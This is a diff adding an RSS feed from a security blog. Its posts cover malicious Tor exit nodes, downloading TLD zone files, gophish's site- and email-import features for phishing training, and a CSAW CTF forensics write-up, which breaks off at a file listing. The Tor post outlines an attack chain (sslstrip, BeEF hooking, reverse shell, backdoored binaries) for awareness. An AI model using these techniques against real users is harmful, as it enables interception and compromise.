@@ -1,0 +1,2551 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Jordan Wright</title>
+    <link>http://jordan-wright.com/blog/</link>
+    <description>Recent content on Jordan Wright</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Tue, 05 Apr 2016 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://jordan-wright.com/blog/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>What Happens When Tor Exit Nodes Break Bad?</title>
+      <link>http://jordan-wright.com/blog/2016/04/05/what-happens-when-tor-exit-nodes-break-bad/</link>
+      <pubDate>Tue, 05 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2016/04/05/what-happens-when-tor-exit-nodes-break-bad/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/heisenberg.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:f95a411bd10674adcf2a6a8ceddf9328&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;When &lt;a href=&#34;http://jordan-wright.com/blog/blog/categories/tor/&#34;&gt;looking at how Tor works&lt;/a&gt;, we&amp;rsquo;ve looked at the various types of nodes that make up the Tor network. However, you&amp;rsquo;ll notice that we haven&amp;rsquo;t dealt too much with &lt;em&gt;exit nodes&lt;/em&gt;. Exit nodes are the final link in a Tor &amp;ldquo;circuit&amp;rdquo;, or path from the client to the server. Since exit nodes send data to the final destination, they can see the data as if it had just left the device.&lt;/p&gt;
+
+&lt;p&gt;This visibility puts quite a bit of trust in exit nodes and, for the most part, they tend to act responsibly. However, this isn&amp;rsquo;t always the case. This post will take a look at what happens when a Tor &lt;a href=&#34;https://i.imgur.com/L8L7k1Z.jpg&#34;&gt;exit node operator&lt;/a&gt; decides to &amp;ldquo;break bad&amp;rdquo; and wreak havoc on Tor users&lt;a href=&#34;#end-1&#34;&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;a-case-of-the-sniffles:f95a411bd10674adcf2a6a8ceddf9328&#34;&gt;A Case of the Sniffles&lt;/h3&gt;
+
+&lt;p&gt;Tor exit nodes are the definition of a man-in-the-middle (MitM). This means that &lt;strong&gt;any&lt;/strong&gt; unencrypted protocols (e.g. FTP, HTTP, SMTP, etc.) can be seen by the exit node operator. This includes things like usernames, passwords, session cookies, or even file uploads/downloads.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;To be clear: Tor exit nodes can see traffic as if it were just leaving your device.&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The unfortunate part about this is that there is nothing (aside from using encrypted protocols&amp;hellip; more on this later) we can do about this. Sniffing is a completely passive operation, so the only protection is to be aware of the risks and avoid passing any sensitive data over Tor unencrypted.&lt;/p&gt;
+
+&lt;p&gt;But let&amp;rsquo;s say you&amp;rsquo;re an exit node operator trying to &lt;em&gt;break bad&lt;/em&gt;, not break slightly-inconvenient. Sniffing is for &lt;strong&gt;chumps&lt;/strong&gt;. Let&amp;rsquo;s turn it up a notch and start modifying some traffic.&lt;/p&gt;
+
+&lt;h3 id=&#34;turn-it-up-to-11:f95a411bd10674adcf2a6a8ceddf9328&#34;&gt;Turn it up to 11&lt;/h3&gt;
+
+&lt;p&gt;Remember - as an exit node operator, we&amp;rsquo;re responsible for passing traffic to and from the client unmodified, right? &lt;a href=&#34;http://i.giphy.com/xT0BKNBeDmlxDkM51e.gif&#34;&gt;Yeah, right&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s take a look at just a few of the ways we can modify traffic:&lt;/p&gt;
+
+&lt;h4 id=&#34;ssl-mitm-sslstrip:f95a411bd10674adcf2a6a8ceddf9328&#34;&gt;SSL MiTM &amp;amp; sslstrip&lt;/h4&gt;
+
+&lt;p&gt;SSL rains on our parade if we&amp;rsquo;re trying to cause havoc for our users. Fortunately for us as attackers, many sites have issues that allow us to force the user through unencrypted connections. Examples include redirects from HTTP to HTTPS, including HTTP content on an HTTPS site, and more.&lt;/p&gt;
+
+&lt;p&gt;A nifty tool to take advantage of this is called &lt;a href=&#34;http://www.thoughtcrime.org/software/sslstrip/&#34;&gt;sslstrip&lt;/a&gt;. All we have to do is proxy the traffic leaving our exit node through sslstrip and it&amp;rsquo;s game over in many scenarios.&lt;/p&gt;
+
+&lt;p&gt;Of course, if we want to be less sneaky, we can just straight up terminate the SSL connections with a self-signed cert. Then we have insight into all the SSL traffic crossing our exit node. Piece of cake.&lt;/p&gt;
+
+&lt;h4 id=&#34;hooking-browsers-with-beef:f95a411bd10674adcf2a6a8ceddf9328&#34;&gt;Hooking Browsers with BeEF&lt;/h4&gt;
+
+&lt;p&gt;Now that we have insight into more traffic than before, we can start doing some damage. One example of this would be to use the &lt;a href=&#34;http://beefproject.com/&#34;&gt;BeEF framework&lt;/a&gt; to automatically &amp;ldquo;hook&amp;rdquo; browsers so they are under our control. Then, we can leverage Metasploit&amp;rsquo;s &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2015/07/16/the-new-metasploit-browser-autopwn-strikes-faster-and-smarter--part-2&#34;&gt;&amp;ldquo;browser autopwn&amp;rdquo;&lt;/a&gt; function to compromise the end host and drop a reverse shell. Game over.&lt;/p&gt;
+
+&lt;h4 id=&#34;backdoor-binaries:f95a411bd10674adcf2a6a8ceddf9328&#34;&gt;Backdoor Binaries&lt;/h4&gt;
+
+&lt;p&gt;Let&amp;rsquo;s say that we see binaries being downloaded through our exit nodes. These can be full software downloads, or even updates to existing software that&amp;rsquo;s happening in the background that the user isn&amp;rsquo;t even aware of.&lt;/p&gt;
+
+&lt;p&gt;All we have to do to transparently backdoor binaries would be to proxy the Tor traffic through something like &lt;a href=&#34;https://github.com/secretsquirrel/the-backdoor-factory&#34;&gt;The Backdoor Factory&lt;/a&gt;. Then, as the software is executed, the end host is compromised. Game over.&lt;/p&gt;
+
+&lt;h3 id=&#34;catching-walter-white:f95a411bd10674adcf2a6a8ceddf9328&#34;&gt;Catching Walter White&lt;/h3&gt;
+
+&lt;p&gt;While most Tor exit nodes (from what we can tell) play nice, it&amp;rsquo;s not terribly uncommon to find some that don&amp;rsquo;t. Remember all those theoretical attacks we just talked about? &lt;a href=&#34;http://www.cs.kau.se/philwint/spoiled_onions/&#34;&gt;They&lt;/a&gt; &lt;a href=&#34;http://packetstorm.foofus.com/papers/attack/jackin-tor.txt&#34;&gt;actually&lt;/a&gt; &lt;a href=&#34;http://www.leviathansecurity.com/blog/the-case-of-the-modified-binaries/&#34;&gt;happened&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Fortunately, the Tor Project thought of this and &lt;a href=&#34;https://trac.torproject.org/projects/tor/wiki/doc/badRelays&#34;&gt;designed a safeguard&lt;/a&gt; to prevent bad exits from being used by clients. This comes in the form of a flag in &lt;a href=&#34;http://jordan-wright.com/blog/blog/2015/05/14/how-tor-works-part-three-the-consensus/&#34;&gt;the consensus&lt;/a&gt;. Not surprisingly, the flag is called &lt;code&gt;BadExit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To address the problem of hunting down bad exit nodes, a slick system called &lt;a href=&#34;https://github.com/NullHypothesis/exitmap&#34;&gt;exitmap&lt;/a&gt; was created.&lt;/p&gt;
+
+&lt;p&gt;Exitmap works like this:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;For each exit node:
+
+&lt;ul&gt;
+&lt;li&gt;Run Python module (file upload/download, login, etc.)&lt;/li&gt;
+&lt;li&gt;Record the results&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Exitmap leverages the awesome &lt;a href=&#34;https://stem.torproject.org/&#34;&gt;Stem&lt;/a&gt; library to do most of the heavy lifting for building circuits to each exit node. Pretty basic, but &lt;em&gt;effective&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Back in 2013, exitmap was created as part of the &lt;a href=&#34;http://www.cs.kau.se/philwint/spoiled_onions/&#34;&gt;Spoiled Onions project&lt;/a&gt;. The authors of the paper found 65 exit nodes that were tampering with traffic. This shows that, while the problem isn&amp;rsquo;t rampant (there were about 1000 exit nodes when they wrote the paper), it&amp;rsquo;s bad enough to warrant a sheriff to make sure exits are playing nice, which is why exitmap is still up, running, and actively maintained.&lt;/p&gt;
+
+&lt;p&gt;In &lt;a href=&#34;https://chloe.re/2015/06/20/a-month-with-badonions/&#34;&gt;another example&lt;/a&gt;, a researcher basically set up a fake login page and logged in through every exit node (similar to exitmap). Then, the HTTP logs were watched for any further login attempts. Multiple nodes tried to break in to the site using the same credentials the author used.&lt;/p&gt;
+
+&lt;h3 id=&#34;this-isn-t-just-tor-s-problem:f95a411bd10674adcf2a6a8ceddf9328&#34;&gt;This Isn&amp;rsquo;t Just Tor&amp;rsquo;s Problem&lt;/h3&gt;
+
+&lt;p&gt;It&amp;rsquo;s important to note that this isn&amp;rsquo;t just Tor&amp;rsquo;s problem. There are a substantial number of hops along any given path, including the normal path between you, your ISP, and the cat picture you&amp;rsquo;re trying to look at. All it takes is one operator with malicious intent to cause serious harm.&lt;/p&gt;
+
+&lt;p&gt;The best thing you can do is to enforce encryption wherever possible. If the traffic can&amp;rsquo;t be seen, it can&amp;rsquo;t (feasibly) be modified.&lt;/p&gt;
+
+&lt;p&gt;Finally, keep in mind this is just an example of what happens when Tor operators act irresponsibly. This is &lt;strong&gt;not&lt;/strong&gt; the norm. In fact, a vast majority of exit node operators take their role very seriously and deserve a major &amp;ldquo;thank you&amp;rdquo; for all the risk they assume to keep information flowing freely.&lt;/p&gt;
+
+&lt;p&gt;&lt;sup id=&#34;end-1&#34;&gt;1&lt;/sup&gt; Actual image of evil Tor exit node operator. &lt;sup&gt;Not really.&lt;/sup&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>How to Download a List of All Registered Domain Names</title>
+      <link>http://jordan-wright.com/blog/2015/09/30/how-to-download-a-list-of-all-registered-domain-names/</link>
+      <pubDate>Wed, 30 Sep 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/09/30/how-to-download-a-list-of-all-registered-domain-names/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/download_domains.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:f02c1fdb4a3462e911a59de78bed39bf&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;Every morning, the infosec field is greeted with an onslaught of freshly registered malicious domains. These domains are used to host phishing sites, maintain botnet command and control, harvest stolen information, and more.&lt;/p&gt;
+
+&lt;p&gt;Having the complete list of registered domains day-by-day offers substantial visibility that can be used for intel and repsonse. Fortunately, such lists not only exist, but are available (usually for free!) with little effort involved. This post will introduce TLD zone files, how to access them, and how they can be used to your benefit.&lt;/p&gt;
+
+&lt;h3 id=&#34;zone-files:f02c1fdb4a3462e911a59de78bed39bf&#34;&gt;Zone Files&lt;/h3&gt;
+
+&lt;p&gt;Before being swamped with domains, let&amp;rsquo;s talk a little about how these lists of domains are organized. Someone has to keep track of all the domains for a certain TLD (.com, .net, .ninja, etc.). These are called the &lt;em&gt;registries&lt;/em&gt;. Each registry maintains a master list of all the domains they are responsible for. This master list is called a &amp;ldquo;&lt;a href=&#34;https://en.wikipedia.org/wiki/Zone_file&#34;&gt;zone file&lt;/a&gt;&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;It&amp;rsquo;s the registry&amp;rsquo;s responsibility to maintain this zone file. As you can imagine, the zone file for TLD&amp;rsquo;s updates many times a day as new domains are registered, other domains expire, and nameserver records are changed.&lt;/p&gt;
+
+&lt;h3 id=&#34;i-just-want-to-download-the-data:f02c1fdb4a3462e911a59de78bed39bf&#34;&gt;I Just Want to Download the Data!&lt;/h3&gt;
+
+&lt;p&gt;So we know what zone files are for, but how do we access them? As mentioned before, each registry is responsible for maintaining the zone file for their TLD, but they are also responsible for maintaining &lt;em&gt;access to&lt;/em&gt; the zone file. This means that in some cases we&amp;rsquo;ll need to go directly to the registrar, but there are some helpful exceptions.&lt;/p&gt;
+
+&lt;h4 id=&#34;com-net-and-name:f02c1fdb4a3462e911a59de78bed39bf&#34;&gt;.COM, .NET, and .NAME&lt;/h4&gt;
+
+&lt;p&gt;Let&amp;rsquo;s start with the most obvious ones: .com, .net, and .name (since it&amp;rsquo;s bundled). These are maintained by Verisign. &lt;a href=&#34;https://www.verisign.com/en_US/channel-resources/domain-registry-products/zone-file/index.xhtml&#34;&gt;Access to these zone files&lt;/a&gt; consists of downloading a &lt;a href=&#34;https://www.verisign.com/assets/VRSN_zonefile_access_request_form_201208.dotx&#34;&gt;Zone Access Form&lt;/a&gt; and emailing the completed form to &lt;code&gt;tldzone@verisign-grs.com&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;It took a couple of weeks for this access to be granted. After your form is approved, you will receive FTP credentials that can be used to download the zone files daily.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@tld:~# ftp rz.verisign-grs.com
+Connected to rz.verisign-grs.com.
+220-**** Welcome to the VeriSign Global Registry Services gTLD Zone FTP Server ****
+220-***
+220-*** This computer system is owned and operated by VeriSign, Inc.
+220-*** All software or information that you access or download from this
+220-*** server is being licensed to you under the terms of our Registrar
+220-*** License and Agreement.  Unauthorized access to this system may
+220-*** result in criminal prosecution.
+220-***
+220-*** All sessions established with this server are monitored and logged.
+220-*** Disconnect now if you do not consent to having your actions monitored
+220-*** and logged.
+220-***
+220-******!
+220
+Name: [redacted]
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+&amp;lt;snip&amp;gt;
+-rw-r--r--    1 ftp      ftp      2497503218 Sep 29 15:20 com.zone.gz
+-rw-r--r--    1 ftp      ftp      321976673 Sep 29 15:12 net.zone.gz
+226 Directory send OK.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We&amp;rsquo;ll take a look at what we can do with these soon. First, let&amp;rsquo;s talk about how we can catch all that malware on &lt;code&gt;.ninja&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h4 id=&#34;the-centralized-zone-data-service-czds:f02c1fdb4a3462e911a59de78bed39bf&#34;&gt;The Centralized Zone Data Service (CZDS)&lt;/h4&gt;
+
+&lt;p&gt;You&amp;rsquo;ve likely noticed that there are a &lt;em&gt;ton&lt;/em&gt; of new gTLDs appearing. At the time of this writing, there are &lt;a href=&#34;https://www.iana.org/domains/root/db&#34;&gt;1070 valid and sponsored TLDs&lt;/a&gt; approved by the IANA - a department of ICANN.&lt;/p&gt;
+
+&lt;p&gt;Since each registry maintains its own zone file, it&amp;rsquo;s overwhelming to try to get access to all of them separately. Fortunately, ICANN solved this problem by creating the Centralized Zone Data Service (CZDS).&lt;/p&gt;
+
+&lt;p&gt;CZDS &amp;ldquo;provides a centralized access point&amp;hellip; to the Zone Files provided by participating Top Level Domains&amp;rdquo;. This means that, by registering with CZDS, we can simultaneously request access to most of the TLD (including those gTLDs) zone files.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/download_domains/czds.png&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;When you get access to a particular zone file, you&amp;rsquo;re able to download it via &lt;a href=&#34;https://czds.icann.org/en/help/api-access&#34;&gt;ICANN&amp;rsquo;s API&lt;/a&gt;. They even provide a &lt;a href=&#34;https://github.com/fourkitchens/czdap-tools&#34;&gt;Python client&lt;/a&gt; that can be used to bulk download all the zone files you have access to.&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, you may not get access to all zone files. In fact, looking at &lt;a href=&#34;https://czdap.icann.org/en/reports&#34;&gt;the most recent report&lt;/a&gt; released by ICANN, TLDs such as &lt;code&gt;.aaa&lt;/code&gt; only have &lt;strong&gt;3&lt;/strong&gt; people authorized to use CZDS to download the zone file. We&amp;rsquo;ll work with what we have, I suppose.&lt;/p&gt;
+
+&lt;p&gt;Ok, we have enough data. Let&amp;rsquo;s start parsing.&lt;/p&gt;
+
+&lt;h3 id=&#34;parsing-zone-files:f02c1fdb4a3462e911a59de78bed39bf&#34;&gt;Parsing Zone Files&lt;/h3&gt;
+
+&lt;p&gt;If you want to parse everything about the zone files, you can read about the full format in &lt;a href=&#34;https://tools.ietf.org/html/rfc1035&#34;&gt;RFC 1035&lt;/a&gt;, but this post is only interested in the domain -&amp;gt; nameserver mappings. So, let&amp;rsquo;s just start by taking a look at the contents of the file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@tld:~# head com.zone -n 50
+; The use of the Data contained in Verisign Inc.&#39;s aggregated
+; .com, and .net top-level domain zone files (including the checksum
+; files) is subject to the restrictions described in the access Agreement
+; with Verisign Inc.
+
+$ORIGIN COM.
+$TTL 900
+@ IN    SOA     a.gtld-servers.net. nstld.verisign-grs.com. (
+                                  1443370544 ;serial
+                                  1800 ;refresh every 30 min
+                                  900 ;retry every 15 min
+                                  604800 ;expire after a week
+                                  86400 ;minimum of a day
+                                  )
+$TTL 172800
+ NS A.GTLD-SERVERS.NET.
+ NS G.GTLD-SERVERS.NET.
+ NS H.GTLD-SERVERS.NET.
+ NS C.GTLD-SERVERS.NET.
+ NS I.GTLD-SERVERS.NET.
+ NS B.GTLD-SERVERS.NET.
+ NS D.GTLD-SERVERS.NET.
+ NS L.GTLD-SERVERS.NET.
+ NS F.GTLD-SERVERS.NET.
+ NS J.GTLD-SERVERS.NET.
+ NS K.GTLD-SERVERS.NET.
+ NS E.GTLD-SERVERS.NET.
+ NS M.GTLD-SERVERS.NET.
+COM. 86400 DNSKEY 257 3 8 AQPD&amp;lt;snip&amp;gt;
+COM. 86400 DNSKEY 256 3 8 AQOp&amp;lt;snip&amp;gt;
+COM. 86400 NSEC3PARAM 1 0 0 -
+COM. 900 RRSIG SOA 8 1 900 20151004161544 20150927150544 35864 COM. MpW&amp;lt;snip&amp;gt;
+COM. RRSIG NS 8 1 172800 20151003045209 20150926034209 35864 COM. mcxl&amp;lt;snip&amp;gt;
+COM. 86400 RRSIG NSEC3PARAM 8 1 86400 20151003045209 20150926034209 35864 COM. SLk71&amp;lt;snip&amp;gt;
+COM. 86400 RRSIG DNSKEY 8 1 86400 20150930182533 20150923182033 30909 COM. pDtt&amp;lt;snip&amp;gt;
+KITCHENEROKTOBERFEST NS NS1.HOSTINGNET
+KITCHENEROKTOBERFEST NS NS2.HOSTINGNET
+KITCHENFLOORTILE NS NS1.HOSTINGNET
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The first 35 lines of the file include some information about the zone file, the root name servers, etc. The actual meat of the file starts on line 36.&lt;/p&gt;
+
+&lt;p&gt;Typically, zone files contain lines that have the following format:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Name&lt;/li&gt;
+&lt;li&gt;TTL&lt;/li&gt;
+&lt;li&gt;Record Class&lt;/li&gt;
+&lt;li&gt;Record Type&lt;/li&gt;
+&lt;li&gt;Record Data&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In our example, we see that &lt;code&gt;KITCHENROKTOBERFEST.COM&lt;/code&gt; (the .com is understood) points to the name servers at &lt;code&gt;NS1.HOSTINGNET.COM&lt;/code&gt; and &lt;code&gt;NS2.HOSTINGNET.COM&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;In addition to lines showing how domain names map to nameservers, at the bottom of the file we have the A records (IP addresses) for each name server in the file. But what if we want to remove all the &amp;ldquo;fluff&amp;rdquo; and only keep the lines showing which domains map to which nameservers?&lt;/p&gt;
+
+&lt;p&gt;We can grab the &amp;ldquo;interesting&amp;rdquo; lines using a simple &lt;code&gt;grep -E &amp;quot;^[a-zA-Z0-9-]+ NS .&amp;quot; com.zone&lt;/code&gt;, which will give us only the lines with domains pointing to nameservers.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@tld:~# grep -E &amp;quot;^[a-zA-Z0-9-]+ NS .&amp;quot; com.zone | head -n 10
+KITCHENEROKTOBERFEST NS NS1.HOSTINGNET
+KITCHENEROKTOBERFEST NS NS2.HOSTINGNET
+KITCHENFLOORTILE NS NS1.HOSTINGNET
+KITCHENFLOORTILE NS NS2.HOSTINGNET
+KITCHENTABLESET NS NS1.HOSTINGNET
+KITCHENTABLESET NS NS2.HOSTINGNET
+KITEPICTURES NS NS1.HOSTINGNET
+KITEPICTURES NS NS2.HOSTINGNET
+BOYSBOXERS NS NS1.HOSTINGNET
+BOYSBOXERS NS NS2.HOSTINGNET
+
+root@tld:~# grep -E &amp;quot;^[a-zA-Z0-9-]+ NS .&amp;quot; com.zone | wc -l
+281899907
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Awesome.&lt;/strong&gt; We can parse this output to do anything we want with our list of domains.&lt;/p&gt;
+
+&lt;h3 id=&#34;conclusion:f02c1fdb4a3462e911a59de78bed39bf&#34;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;There are a &lt;em&gt;ton&lt;/em&gt; of use cases for this data in terms of information security, such as typo-squat monitoring, DGA monitoring, bit flip monitoring, etc.
+However, while this is an infosec blog, zone files can be used for far more than that. It could be used to detect name trends, watch for certain keywords, and more.&lt;/p&gt;
+
+&lt;p&gt;Now, consider what would happen if you kept a version controlled &lt;em&gt;diff&lt;/em&gt; of this data every day. That would allow you to see trends over time or, for infosec, watch how domains change. Domain move behind Cloudflare/Akamai? You&amp;rsquo;ll have a record of what nameserver they pointed to before the move.&lt;/p&gt;
+
+&lt;p&gt;I hope this sheds some light on not only how useful zone files are, but also how &lt;strong&gt;accessible&lt;/strong&gt; they are. ICANN, Verisign, and other registries deserve credit for making this data available to the public.&lt;/p&gt;
+
+&lt;p&gt;As always, let me know if you have questions/comments.&lt;/p&gt;
+
+&lt;p&gt;-Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Gophish Update - Importing Sites and Emails</title>
+      <link>http://jordan-wright.com/blog/2015/09/29/gophish-update-importing-sites-and-emails/</link>
+      <pubDate>Tue, 29 Sep 2015 06:45:33 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/09/29/gophish-update-importing-sites-and-emails/</guid>
+      <description>
+
+&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/gophish_purple.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;h3 id=&#34;introduction:2a9445cd46ce65423aab69c1e387d2fb&#34;&gt;Introduction&lt;/h3&gt;
+
+&lt;p&gt;I&amp;rsquo;m excited to announce that the &lt;a href=&#34;https://github.com/jordan-wright/gophish&#34;&gt;gophish&lt;/a&gt; &amp;ldquo;alpha&amp;rdquo; release is almost complete! I&amp;rsquo;m just cleaning up a few bugs, touching some things up, etc. In the meantime, I wanted to write a quick post to show off some really slick features that I was able to add earlier than planned.&lt;/p&gt;
+
+&lt;p&gt;Creating pixel-perfect email templates and landing pages are crucial to delivering the best possible phishing training. Gophish has always had the ability to create these, but it was quite frankly a &lt;em&gt;pain&lt;/em&gt; to use as you needed the raw HTML or text for both the email and site content. In this post, let&amp;rsquo;s take a look at how we can now &lt;strong&gt;import sites and emails directly into gophish&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;importing-sites:2a9445cd46ce65423aab69c1e387d2fb&#34;&gt;Importing Sites&lt;/h3&gt;
+
+&lt;p&gt;Attackers often &lt;a href=&#34;http://jordan-wright.com/blog/blog/2014/07/30/how-to-hunt-down-phishing-kits/&#34;&gt;create phishing kits&lt;/a&gt; containing exact copies of web site content in an attempt to fool users into entering credentials. To have training that keeps up with this pace, we need the ability to mimic this behavior and clone a site effectively.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s take a look at how easy it is to import a site using gophish:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/gophish_screenshots/import_site.gif&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;This works by grabbing the HTML content of the site and adding a &lt;code&gt;&amp;lt;base&amp;gt;&lt;/code&gt; tag so that relative resources (like CSS, JS, etc.) are loaded from the site itself.&lt;/p&gt;
+
+&lt;p&gt;You could use this functionality to clone things such as your own webmail login, company webpage, or other services that the users may be prone to entering sensitive information into. Of course, once you import a site, you&amp;rsquo;re free to edit it to add template variables, change links, etc. through the gophish editor.&lt;/p&gt;
+
+&lt;h3 id=&#34;importing-email:2a9445cd46ce65423aab69c1e387d2fb&#34;&gt;Importing Email&lt;/h3&gt;
+
+&lt;p&gt;The emails you use in your training are the bait to your phish. Having believable emails is the key to good training, since this will show users first-hand how legit phishing emails can look.&lt;/p&gt;
+
+&lt;p&gt;What better way to get some believable looking email templates than to use &lt;em&gt;real&lt;/em&gt; emails? Now you can import an email in gophish via a simple copy/paste from your email client.&lt;/p&gt;
+
+&lt;p&gt;Here&amp;rsquo;s an example showing how we can import an email from Gmail:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/blog/gophish_screenshots/import_email.gif&#34;/&gt;&lt;/p&gt;
+
+&lt;p&gt;This functionality is provided by the Go &lt;a href=&#34;https://github.com/jordan-wright/email&#34;&gt;email&lt;/a&gt; library I initially created specifically for gophish. The import function takes care of most of the decoding for you, but if you have any issues please let me know by &lt;a href=&#34;https://github.com/jordan-wright/gophish/issues&#34;&gt;filing an issue!&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;conclusion:2a9445cd46ce65423aab69c1e387d2fb&#34;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;I&amp;rsquo;m really excited to release gophish in the upcoming month or so and bring enterprise-grade phishing training to &lt;em&gt;anyone&lt;/em&gt; who wants it. Until then, keep checking out the pre-alpha and &lt;a href=&#34;https://github.com/jordan-wright/gophish/issues&#34;&gt;let me know&lt;/a&gt; if you have any questions or comments!&lt;/p&gt;
+
+&lt;p&gt;Jordan (&lt;a href=&#34;https://twitter.com/jw_sec&#34;&gt;@jw_sec&lt;/a&gt;)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>CSAW CTF 2015 - Forensics 100 Flash Writeup</title>
+      <link>http://jordan-wright.com/blog/2015/09/22/csaw-ctf-2015-forensics-100-flash-writeup/</link>
+      <pubDate>Tue, 22 Sep 2015 20:51:43 +0000</pubDate>
+      
+      <guid>http://jordan-wright.com/blog/2015/09/22/csaw-ctf-2015-forensics-100-flash-writeup/</guid>
+      <description>&lt;img src=&#34;http://jordan-wright.com/blog/blog/images/headers/csaw_100.png&#34; alt=&#34;&#34; class=&#34;pure-img&#34; &gt;
+
+
+&lt;p&gt;For this challenge, we were given an HDD image and asked to find the flag on it.&lt;/p&gt;
+
+&lt;p&gt;Let&amp;rsquo;s start by seeing what kind of file we&amp;rsquo;re dealing with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;jordan@temp:~/csaw$ file flash_c8429a430278283c0e571baebca3d139.img
+flash_c8429a430278283c0e571baebca3d139.img: x86 boot sector, mkdosfs boot message display, code offset 0x3c, OEM-ID &amp;quot;mkfs.fat&amp;quot;, sectors/cluster 4, root entries 512, Media descriptor 0xf8, sectors/FAT 256, heads 64, sectors 262144 (volumes &amp;gt; 32 MB) , serial number 0xa0f1dff7, unlabeled, FAT (16 bit)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ok, a standard FAT volume. Let&amp;rsquo;s try to mount it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;jordan@temp:~/csaw$ mount flash_c8429a430278283c0e571baebca3d139.img -t vfat -o loop,ro,noexec /mnt
+jordan@temp:~$ cd /mnt/
+jordan@temp:/mnt$ ls
+100.txt  29.txt  48.txt  67.txt  86.txt      pg1184.txt  pg2000.txt  pg4300.txt
+10.txt   2.txt   49.txt  68.txt  87.txt      pg11.txt    pg2147.txt  pg4363.txt
+11.txt   30.txt  4.txt   69.txt  88.txt      pg120.txt   pg2148.txt  pg46.txt
+12.txt   31.txt  50.txt  6.txt   89.txt      pg1232.txt  pg236.txt   pg5000.txt
+13.txt   32.txt  51.txt  70.txt  8.txt       pg1260.txt  pg23.txt    pg5200.txt
+14.txt   33.txt  52.txt  71.txt  90.txt      pg1322.txt  pg244.txt   pg526.txt
+15.txt   34.txt  53.txt  72.txt  91.txt      pg132.txt   pg2500.txt  pg55.txt
+16.txt   35.txt  54.txt  73.txt  92.txt      pg1342.txt  pg2542.txt  pg62.txt
+17.txt   36.txt  55.txt  74.txt  93.txt      pg135.txt   pg2554.txt  pg730.txt
+18.txt   37.txt  56.txt  75.txt  94.txt      pg1399.txt  pg2591.txt  pg74.txt
+19.txt   38.txt  57.txt  76.txt  95.txt      pg1400.txt  pg2600.txt  pg768.txt
+1.txt    39.txt  58.txt  77.txt  96.txt      pg1497.txt  pg2701.txt  pg76.txt
+20.txt   3.txt   59.txt  78.txt  97.txt      pg158.txt   pg2814.txt  pg844.txt
